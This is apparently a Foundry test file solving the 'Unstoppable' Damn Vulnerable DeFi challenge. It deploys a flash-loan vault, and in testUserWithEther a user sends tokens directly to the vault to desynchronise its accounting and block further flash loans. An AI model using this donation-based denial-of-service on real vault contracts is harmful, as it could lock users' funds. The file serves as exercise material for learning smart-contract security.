// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import  { Test, console2 }   from "forge-std/Test.sol";
import {ERC20} from  "@solmate/src/tokens/ERC4626.sol";
import "../src/UnstoppableVault.sol";
import "../src/ReceiverUnstoppable.sol";
import {DamnValuableToken} from "./mock/DamnValuableToken.sol";

contract UnstoppableVaultTest is Test {
    
    UnstoppableVault unstoppableVault;
    DamnValuableToken damnValuableToken;
    ReceiverUnstoppable receiverUnstoppable;

    address owner = makeAddr("owner");
    address feeRecipient = makeAddr("feeRecipient");

    address user = makeAddr("user");

    uint256 tokenInVault = 1000000e18;
    uint256 initialPlayerTokenBalance = 10e18;

    function setUp() public {
        damnValuableToken = new DamnValuableToken();
        unstoppableVault =  new UnstoppableVault(damnValuableToken,owner, feeRecipient);
        receiverUnstoppable = new ReceiverUnstoppable(address(unstoppableVault));
        ERC20 assetVault  = unstoppableVault.asset();

        assertEq(address(assetVault),address(damnValuableToken) );

        damnValuableToken.approve(address(unstoppableVault), tokenInVault);
        unstoppableVault.deposit(tokenInVault, owner);

        

        assertEq( damnValuableToken.balanceOf(address(unstoppableVault)), tokenInVault);
        assertEq( unstoppableVault.totalAssets(), tokenInVault);
        assertEq( unstoppableVault.totalSupply(), tokenInVault);
        assertEq( unstoppableVault.maxFlashLoan(address(damnValuableToken)), tokenInVault);
        assertEq( unstoppableVault.flashFee(address(damnValuableToken), tokenInVault-1), 0);
        assertEq( unstoppableVault.flashFee(address(damnValuableToken), tokenInVault), 50000e18);

        receiverUnstoppable.executeFlashLoan(100e18);
        damnValuableToken.approve(user, initialPlayerTokenBalance);
        damnValuableToken.transfer(user,initialPlayerTokenBalance );

        assertEq( damnValuableToken.balanceOf(address(user)), initialPlayerTokenBalance);

    }

    function testUserWithEther() public {
        
        /// Allocate Ether to `user`
        vm.deal(user, 10 ether); // Gives the `user` 10 Ether
       
        vm.startPrank(user);
        console2.log(damnValuableToken.balanceOf(address(unstoppableVault)));
        damnValuableToken.transfer(address(unstoppableVault), initialPlayerTokenBalance);
        console2.log(damnValuableToken.balanceOf(address(unstoppableVault)));
        
        vm.stopPrank();
        
        receiverUnstoppable.executeFlashLoan(100e18);
        
        
    }

  
}


